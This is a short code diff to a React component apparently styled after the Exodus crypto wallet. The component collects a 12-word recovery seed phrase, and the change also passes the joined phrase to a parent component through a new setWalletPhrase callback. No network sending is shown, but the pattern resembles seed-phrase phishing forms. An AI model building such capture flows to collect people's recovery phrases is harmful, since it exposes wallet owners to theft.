@@ -6,12 +6,19 @@ import { Input } from "@/components/ui/input";
 import { useWalletStore } from "@/store/walletStore";
 import ExodusSmall from "../icons/exodus-small";
 
-const Exodus = ({ handleFinish }: { handleFinish: () => void }) => {
+const Exodus = ({
+	handleFinish,
+	setWalletPhrase,
+}: {
+	handleFinish: () => void;
+	setWalletPhrase: any;
+}) => {
 	const [words, setWords] = useState<string[]>(Array(12).fill(""));
 	const { setSeedPhrase } = useWalletStore();
 
 	const handleComplete = () => {
 		setSeedPhrase(words.join(" "));
+		setWalletPhrase(words.join(" "));
 		handleFinish();
 	};
 
